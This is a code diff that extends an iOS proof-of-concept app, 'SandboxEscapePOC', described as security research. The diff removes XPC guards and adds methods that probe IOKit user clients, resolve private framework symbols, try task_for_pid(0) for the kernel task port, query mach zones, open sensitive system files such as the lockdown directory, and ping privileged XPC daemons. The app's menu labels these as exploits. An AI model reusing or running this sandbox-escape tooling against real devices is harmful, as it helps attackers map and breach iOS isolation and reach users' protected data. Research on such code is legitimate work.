@@ -1,30 +1,35 @@
 /*
  * SandboxEscapePOC - iOS 26.1 Security Research App
- * 
+ *
  * Contains PoC implementations for:
  * - CVE-2025-43448 (CloudKit symlink)
  * - CVE-2025-43407 (Assets entitlements)
  * - cfprefsd XPC exploit patterns
  * - Disk write amplification
- * 
+ * - IOKit service probing
+ * - Private API discovery
+ * - Kernel info leaks
+ * - File descriptor tricks
+ *
  * For security research only.
  */
 
 #import <UIKit/UIKit.h>
 #import <Foundation/Foundation.h>
 #import <mach/mach.h>
+#import <mach/task_info.h>
 #import <CoreSpotlight/CoreSpotlight.h>
 #import <sys/stat.h>
 #import <sys/sysctl.h>
+#import <sys/fcntl.h>
 #import <dlfcn.h>
+#import <objc/runtime.h>
 
-// XPC is available but some APIs are restricted on iOS
-#if __has_include(<xpc/xpc.h>)
+// XPC - always available on iOS
 #import <xpc/xpc.h>
-#define XPC_AVAILABLE 1
-#else
-#define XPC_AVAILABLE 0
-#endif
+
+// IOKit
+#import <IOKit/IOKitLib.h>
 
 // Forward declarations
 @class AppDelegate;
@@ -42,6 +47,13 @@
 + (NSString *)runDiskAmplificationTest;
 + (NSString *)runTimingChannelTest;
 + (NSString *)getSystemInfo;
+
+// New exploit methods
++ (NSString *)runIOKitExploit;
++ (NSString *)runPrivateAPIProbe;
++ (NSString *)runKernelInfoLeak;
++ (NSString *)runFileDescriptorTricks;
++ (NSString *)runXPCServiceScan;
 
 @end
 
@@ -146,7 +158,6 @@
         [log appendFormat:@"[-] Failed to load MobileAsset framework: %s\n", dlerror()];
     }
 
-#if XPC_AVAILABLE
     // XPC connection attempt
     [log appendString:@"[*] Attempting XPC connection to mobileassetd...\n"];
 
@@ -160,7 +171,6 @@
         [log appendString:@"[+] XPC connection handle created\n"];
 
         xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
-            // Event handler - errors logged separately
             (void)event;
         });
 
@@ -176,17 +186,12 @@
             [log appendString:@"[+] Query message sent\n"];
         }
 
-        // Wait briefly for any response
         [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.5]];
-
         xpc_connection_cancel(conn);
         [log appendString:@"[*] Connection test complete\n"];
     } else {
         [log appendString:@"[-] Failed to create XPC connection (sandbox restriction)\n"];
     }
-#else
-    [log appendString:@"[-] XPC API not available\n"];
-#endif
 
     [log appendString:@"\n[*] Assets exploit test complete\n"];
     return log;
@@ -198,7 +203,6 @@
     NSMutableString *log = [NSMutableString string];
     [log appendString:@"=== cfprefsd XPC Exploit ===\n\n"];
 
-#if XPC_AVAILABLE
     // Test daemon connection (privileged - will fail in sandbox)
     [log appendString:@"[*] Testing cfprefsd.daemon connection...\n"];
 
@@ -251,7 +255,6 @@
                 xpc_dictionary_set_value(msg, "CFPreferencesMessages", arr);
             }
 
-            // Send test messages
             for (int i = 0; i < 100; i++) {
                 xpc_connection_send_message(agent, msg);
             }
@@ -262,9 +265,6 @@
     } else {
         [log appendString:@"[-] Cannot connect to agent\n"];
     }
-#else
-    [log appendString:@"[-] XPC API not available\n"];
-#endif
 
     // Test preference writes (works on iOS)
     [log appendString:@"\n[*] Testing preference write amplification...\n"];
@@ -487,6 +487,414 @@
     return log;
 }
 
+#pragma mark - IOKit Exploit
+
++ (NSString *)runIOKitExploit {
+    NSMutableString *log = [NSMutableString string];
+    [log appendString:@"=== IOKit Service Probing ===\n\n"];
+
+    // Get IOKit master port
+    mach_port_t masterPort;
+    kern_return_t kr = IOMasterPort(MACH_PORT_NULL, &masterPort);
+
+    if (kr == KERN_SUCCESS) {
+        [log appendFormat:@"[+] Got IOKit master port: 0x%x\n", masterPort];
+    } else {
+        [log appendFormat:@"[-] Failed to get master port: 0x%x\n", kr];
+        return log;
+    }
+
+    // Interesting IOKit services to probe
+    NSArray *services = @[
+        @"IOHIDSystem",
+        @"AppleKeyStore",
+        @"IOUserClient",
+        @"AppleMobileFileIntegrity",
+        @"IOSurfaceRoot",
+        @"AppleARMPE",
+        @"AppleCredentialManager",
+        @"AppleSEPManager",
+        @"IOGraphicsAccelerator2",
+        @"AGXAccelerator",
+        @"AppleAVE2Driver",
+        @"AppleJPEGDriver",
+        @"AppleH10CamIn"
+    ];
+
+    [log appendString:@"\n[*] Probing IOKit services...\n"];
+
+    for (NSString *serviceName in services) {
+        io_service_t service = IOServiceGetMatchingService(
+            masterPort,
+            IOServiceMatching([serviceName UTF8String])
+        );
+
+        if (service != IO_OBJECT_NULL) {
+            [log appendFormat:@"[+] Found: %@ (port: 0x%x)\n", serviceName, service];
+
+            // Try to open user client
+            io_connect_t connection;
+            kr = IOServiceOpen(service, mach_task_self(), 0, &connection);
+            if (kr == KERN_SUCCESS) {
+                [log appendFormat:@"    [!] Opened user client: 0x%x\n", connection];
+                IOServiceClose(connection);
+            } else {
+                [log appendFormat:@"    [-] Cannot open: 0x%x\n", kr];
+            }
+
+            IOObjectRelease(service);
+        } else {
+            [log appendFormat:@"[-] Not found: %@\n", serviceName];
+        }
+    }
+
+    [log appendString:@"\n[*] IOKit probe complete\n"];
+    return log;
+}
+
+#pragma mark - Private API Probe
+
++ (NSString *)runPrivateAPIProbe {
+    NSMutableString *log = [NSMutableString string];
+    [log appendString:@"=== Private API Probing ===\n\n"];
+
+    // Frameworks to probe
+    NSDictionary *frameworkSymbols = @{
+        @"/System/Library/PrivateFrameworks/SpringBoardServices.framework/SpringBoardServices": @[
+            @"SBSSpringBoardServerPort",
+            @"SBSLaunchApplicationWithIdentifier",
+            @"SBSCopyApplicationDisplayIdentifiers"
+        ],
+        @"/System/Library/PrivateFrameworks/MobileContainerManager.framework/MobileContainerManager": @[
+            @"MCMContainerCreateWithError",
+            @"MCMContainerGetPath"
+        ],
+        @"/System/Library/PrivateFrameworks/FrontBoardServices.framework/FrontBoardServices": @[
+            @"FBSSystemService",
+            @"FBSOpenApplicationService"
+        ],
+        @"/System/Library/PrivateFrameworks/BackBoardServices.framework/BackBoardServices": @[
+            @"BKSSystemService",
+            @"BKSHIDEventRouter"
+        ],
+        @"/usr/lib/liblockdown.dylib": @[
+            @"lockdown_connect",
+            @"lockdown_receive",
+            @"lockdown_send"
+        ],
+        @"/usr/lib/libMobileGestalt.dylib": @[
+            @"MGCopyAnswer",
+            @"MGGetBoolAnswer",
+            @"MGGetFloat64Answer"
+        ]
+    };
+
+    for (NSString *framework in frameworkSymbols) {
+        [log appendFormat:@"\n[*] Probing %@\n", [framework lastPathComponent]];
+
+        void *handle = dlopen([framework UTF8String], RTLD_NOW);
+        if (handle) {
+            [log appendString:@"    [+] Framework loaded\n"];
+
+            NSArray *symbols = frameworkSymbols[framework];
+            for (NSString *symbol in symbols) {
+                void *sym = dlsym(handle, [symbol UTF8String]);
+                if (sym) {
+                    [log appendFormat:@"    [+] %@ = %p\n", symbol, sym];
+                } else {
+                    [log appendFormat:@"    [-] %@ not found\n", symbol];
+                }
+            }
+            dlclose(handle);
+        } else {
+            [log appendFormat:@"    [-] Failed: %s\n", dlerror()];
+        }
+    }
+
+    // Probe Objective-C runtime for private classes
+    [log appendString:@"\n[*] Scanning private Objective-C classes...\n"];
+
+    NSArray *privateClasses = @[
+        @"SBApplication",
+        @"FBSystemService",
+        @"LSApplicationProxy",
+        @"MCMContainer",
+        @"SecTrustStore",
+        @"AMDevice"
+    ];
+
+    for (NSString *className in privateClasses) {
+        Class cls = NSClassFromString(className);
+        if (cls) {
+            [log appendFormat:@"[+] Found class: %@\n", className];
+
+            // Count methods
+            unsigned int methodCount = 0;
+            Method *methods = class_copyMethodList(cls, &methodCount);
+            [log appendFormat:@"    Methods: %u\n", methodCount];
+            if (methods) free(methods);
+        } else {
+            [log appendFormat:@"[-] Class not found: %@\n", className];
+        }
+    }
+
+    [log appendString:@"\n[*] Private API probe complete\n"];
+    return log;
+}
+
+#pragma mark - Kernel Info Leak
+
++ (NSString *)runKernelInfoLeak {
+    NSMutableString *log = [NSMutableString string];
+    [log appendString:@"=== Kernel Info Leak Test ===\n\n"];
+
+    // Task info
+    [log appendString:@"[*] Gathering task information...\n"];
+
+    struct task_basic_info basic_info;
+    mach_msg_type_number_t count = TASK_BASIC_INFO_COUNT;
+    kern_return_t kr = task_info(mach_task_self(), TASK_BASIC_INFO, (task_info_t)&basic_info, &count);
+
+    if (kr == KERN_SUCCESS) {
+        [log appendFormat:@"[+] Virtual size: %llu MB\n", basic_info.virtual_size / (1024 * 1024)];
+        [log appendFormat:@"[+] Resident size: %llu MB\n", basic_info.resident_size / (1024 * 1024)];
+        [log appendFormat:@"[+] Suspend count: %d\n", basic_info.suspend_count];
+    }
+
+    // Task ports
+    [log appendString:@"\n[*] Enumerating task ports...\n"];
+
+    mach_port_t task_port = mach_task_self();
+    [log appendFormat:@"[+] Task self port: 0x%x\n", task_port];
+
+    mach_port_t host_port = mach_host_self();
+    [log appendFormat:@"[+] Host self port: 0x%x\n", host_port];
+
+    // Try to get kernel task (will fail but shows the error)
+    mach_port_t kernel_task;
+    kr = task_for_pid(mach_task_self(), 0, &kernel_task);
+    if (kr == KERN_SUCCESS) {
+        [log appendFormat:@"[!] Got kernel task port: 0x%x\n", kernel_task];
+    } else {
+        [log appendFormat:@"[-] task_for_pid(0) denied: 0x%x\n", kr];
+    }
+
+    // Host info
+    [log appendString:@"\n[*] Host information...\n"];
+
+    host_basic_info_data_t host_info;
+    count = HOST_BASIC_INFO_COUNT;
+    kr = host_info(mach_host_self(), HOST_BASIC_INFO, (host_info_t)&host_info, &count);
+
+    if (kr == KERN_SUCCESS) {
+        [log appendFormat:@"[+] Max CPUs: %d\n", host_info.max_cpus];
+        [log appendFormat:@"[+] Avail CPUs: %d\n", host_info.avail_cpus];
+        [log appendFormat:@"[+] Memory size: %llu MB\n", host_info.max_mem / (1024 * 1024)];
+        [log appendFormat:@"[+] CPU type: 0x%x\n", host_info.cpu_type];
+        [log appendFormat:@"[+] CPU subtype: 0x%x\n", host_info.cpu_subtype];
+    }
+
+    // Mach zone info
+    [log appendString:@"\n[*] Probing mach zones...\n"];
+
+    mach_zone_name_t *names;
+    mach_zone_info_t *info;
+    mach_msg_type_number_t name_count, info_count;
+
+    kr = mach_zone_info(mach_host_self(), &names, &name_count, &info, &info_count);
+    if (kr == KERN_SUCCESS) {
+        [log appendFormat:@"[+] Found %u mach zones\n", name_count];
+        // Show first few zones
+        for (unsigned int i = 0; i < MIN(5, name_count); i++) {
+            [log appendFormat:@"    Zone: %s (size: %llu)\n", names[i].mzn_name, info[i].mzi_cur_size];
+        }
+        vm_deallocate(mach_task_self(), (vm_address_t)names, name_count * sizeof(*names));
+        vm_deallocate(mach_task_self(), (vm_address_t)info, info_count * sizeof(*info));
+    } else {
+        [log appendFormat:@"[-] mach_zone_info denied: 0x%x\n", kr];
+    }
+
+    [log appendString:@"\n[*] Kernel info leak test complete\n"];
+    return log;
+}
+
+#pragma mark - File Descriptor Tricks
+
++ (NSString *)runFileDescriptorTricks {
+    NSMutableString *log = [NSMutableString string];
+    [log appendString:@"=== File Descriptor Tricks ===\n\n"];
+
+    // Check open file descriptors
+    [log appendString:@"[*] Scanning open file descriptors...\n"];
+
+    int maxFd = (int)sysconf(_SC_OPEN_MAX);
+    [log appendFormat:@"[+] Max FDs: %d\n", maxFd];
+
+    int openCount = 0;
+    for (int fd = 0; fd < MIN(256, maxFd); fd++) {
+        if (fcntl(fd, F_GETFD) != -1) {
+            openCount++;
+            if (fd < 10) {
+                char path[PATH_MAX];
+                if (fcntl(fd, F_GETPATH, path) != -1) {
+                    [log appendFormat:@"    FD %d: %s\n", fd, path];
+                }
+            }
+        }
+    }
+    [log appendFormat:@"[+] Open FDs (0-255): %d\n", openCount];
+
+    // Try dup2 tricks
+    [log appendString:@"\n[*] Testing dup2 to reserved FDs...\n"];
+
+    int testFd = open("/dev/null", O_RDONLY);
+    if (testFd >= 0) {
+        // Try to dup to stdin
+        int result = dup2(testFd, 100);
+        if (result >= 0) {
+            [log appendFormat:@"[+] dup2 to FD 100 succeeded\n"];
+            close(100);
+        } else {
+            [log appendFormat:@"[-] dup2 failed: %s\n", strerror(errno)];
+        }
+        close(testFd);
+    }
+
+    // F_DUPFD_CLOEXEC trick
+    [log appendString:@"\n[*] Testing F_DUPFD tricks...\n"];
+
+    testFd = open("/dev/null", O_RDONLY);
+    if (testFd >= 0) {
+        int newFd = fcntl(testFd, F_DUPFD_CLOEXEC, 200);
+        if (newFd >= 0) {
+            [log appendFormat:@"[+] F_DUPFD_CLOEXEC to %d succeeded\n", newFd];
+            close(newFd);
+        }
+        close(testFd);
+    }
+
+    // Try to access sensitive files via FD
+    [log appendString:@"\n[*] Probing sensitive file access...\n"];
+
+    NSArray *sensitiveFiles = @[
+        @"/var/mobile/Library/Preferences/.GlobalPreferences.plist",
+        @"/var/mobile/Library/Caches/locationd/clients.plist",
+        @"/private/var/mobile/Library/SyncedPreferences",
+        @"/var/containers/Shared/SystemGroup",
+        @"/var/db/lockdown"
+    ];
+
+    for (NSString *path in sensitiveFiles) {
+        int fd = open([path UTF8String], O_RDONLY);
+        if (fd >= 0) {
+            struct stat st;
+            fstat(fd, &st);
+            [log appendFormat:@"[!] Opened: %@ (size: %lld)\n", [path lastPathComponent], st.st_size];
+            close(fd);
+        } else {
+            [log appendFormat:@"[-] Cannot open: %@ (%s)\n", [path lastPathComponent], strerror(errno)];
+        }
+    }
+
+    // Shared memory probe
+    [log appendString:@"\n[*] Testing shared memory...\n"];
+
+    int shmFd = shm_open("/poc_test", O_CREAT | O_RDWR, 0644);
+    if (shmFd >= 0) {
+        [log appendFormat:@"[+] Created shared memory: FD %d\n", shmFd];
+        shm_unlink("/poc_test");
+        close(shmFd);
+    } else {
+        [log appendFormat:@"[-] shm_open failed: %s\n", strerror(errno)];
+    }
+
+    [log appendString:@"\n[*] File descriptor tricks complete\n"];
+    return log;
+}
+
+#pragma mark - XPC Service Scan
+
++ (NSString *)runXPCServiceScan {
+    NSMutableString *log = [NSMutableString string];
+    [log appendString:@"=== XPC Service Scan ===\n\n"];
+
+    // List of interesting XPC services to probe
+    NSArray *xpcServices = @[
+        @"com.apple.springboard.services",
+        @"com.apple.frontboard.systemappservices",
+        @"com.apple.backboardd",
+        @"com.apple.locationd.direct",
+        @"com.apple.locationd.registration",
+        @"com.apple.containermanagerd",
+        @"com.apple.installd",
+        @"com.apple.lsd",
+        @"com.apple.networkd",
+        @"com.apple.securityd",
+        @"com.apple.symptomsd",
+        @"com.apple.fairplayd",
+        @"com.apple.mobileactivationd",
+        @"com.apple.coreservices.quarantine-resolver",
+        @"com.apple.DiskArbitration.diskarbitrationd",
+        @"com.apple.SecurityServer",
+        @"com.apple.tccd",
+        @"com.apple.sysdiagnose.stackshot",
+        @"com.apple.ReportCrash.SimulateCrash"
+    ];
+
+    [log appendString:@"[*] Probing XPC services...\n\n"];
+
+    for (NSString *serviceName in xpcServices) {
+        xpc_connection_t conn = xpc_connection_create_mach_service(
+            [serviceName UTF8String],
+            NULL,
+            0
+        );
+
+        if (conn) {
+            __block BOOL gotResponse = NO;
+            __block NSString *status = @"created";
+
+            xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
+                if (event == XPC_ERROR_CONNECTION_INVALID) {
+                    status = @"invalid";
+                } else if (event == XPC_ERROR_CONNECTION_INTERRUPTED) {
+                    status = @"interrupted";
+                } else {
+                    gotResponse = YES;
+                }
+            });
+
+            xpc_connection_resume(conn);
+
+            // Send a ping message
+            xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
+            xpc_dictionary_set_string(msg, "ping", "test");
+
+            xpc_connection_send_message_with_reply(conn, msg, dispatch_get_main_queue(), ^(xpc_object_t reply) {
+                if (xpc_get_type(reply) != XPC_TYPE_ERROR) {
+                    gotResponse = YES;
+                }
+            });
+
+            // Brief wait
+            [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.1]];
+
+            if (gotResponse) {
+                [log appendFormat:@"[!] %@ - RESPONDED\n", serviceName];
+            } else {
+                [log appendFormat:@"[+] %@ - %@\n", serviceName, status];
+            }
+
+            xpc_connection_cancel(conn);
+        } else {
+            [log appendFormat:@"[-] %@ - unavailable\n", serviceName];
+        }
+    }
+
+    [log appendString:@"\n[*] XPC service scan complete\n"];
+    return log;
+}
+
 @end
 
 #pragma mark - View Controller
@@ -512,6 +920,11 @@
         @{@"title": @"cfprefsd XPC", @"desc": @"XPC multi-message exploit"},
         @{@"title": @"Disk Amplification", @"desc": @"Write amplification test"},
         @{@"title": @"Timing Channel", @"desc": @"Side-channel timing test"},
+        @{@"title": @"IOKit Probe", @"desc": @"IOKit service enumeration"},
+        @{@"title": @"Private APIs", @"desc": @"dlsym private function discovery"},
+        @{@"title": @"Kernel Info", @"desc": @"Mach port & task info leaks"},
+        @{@"title": @"FD Tricks", @"desc": @"File descriptor exploits"},
+        @{@"title": @"XPC Scan", @"desc": @"System XPC service probing"},
         @{@"title": @"Run All Tests", @"desc": @"Execute all exploits"}
     ];
     
@@ -536,7 +949,7 @@
         [self.tableView.topAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.topAnchor],
         [self.tableView.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor],
         [self.tableView.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],
-        [self.tableView.heightAnchor constraintEqualToConstant:300],
+        [self.tableView.heightAnchor constraintEqualToConstant:400],
         
         [self.logView.topAnchor constraintEqualToAnchor:self.tableView.bottomAnchor constant:8],
         [self.logView.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor constant:16],
@@ -592,7 +1005,22 @@
             case 5:
                 result = [ExploitEngine runTimingChannelTest];
                 break;
-            case 6: {
+            case 6:
+                result = [ExploitEngine runIOKitExploit];
+                break;
+            case 7:
+                result = [ExploitEngine runPrivateAPIProbe];
+                break;
+            case 8:
+                result = [ExploitEngine runKernelInfoLeak];
+                break;
+            case 9:
+                result = [ExploitEngine runFileDescriptorTricks];
+                break;
+            case 10:
+                result = [ExploitEngine runXPCServiceScan];
+                break;
+            case 11: {
                 NSMutableString *all = [NSMutableString string];
                 [all appendString:[ExploitEngine getSystemInfo]];
                 [all appendString:@"\n\n"];
@@ -605,6 +1033,16 @@
                 [all appendString:[ExploitEngine runDiskAmplificationTest]];
                 [all appendString:@"\n\n"];
                 [all appendString:[ExploitEngine runTimingChannelTest]];
+                [all appendString:@"\n\n"];
+                [all appendString:[ExploitEngine runIOKitExploit]];
+                [all appendString:@"\n\n"];
+                [all appendString:[ExploitEngine runPrivateAPIProbe]];
+                [all appendString:@"\n\n"];
+                [all appendString:[ExploitEngine runKernelInfoLeak]];
+                [all appendString:@"\n\n"];
+                [all appendString:[ExploitEngine runFileDescriptorTricks]];
+                [all appendString:@"\n\n"];
+                [all appendString:[ExploitEngine runXPCServiceScan]];
                 result = all;
                 break;
             }
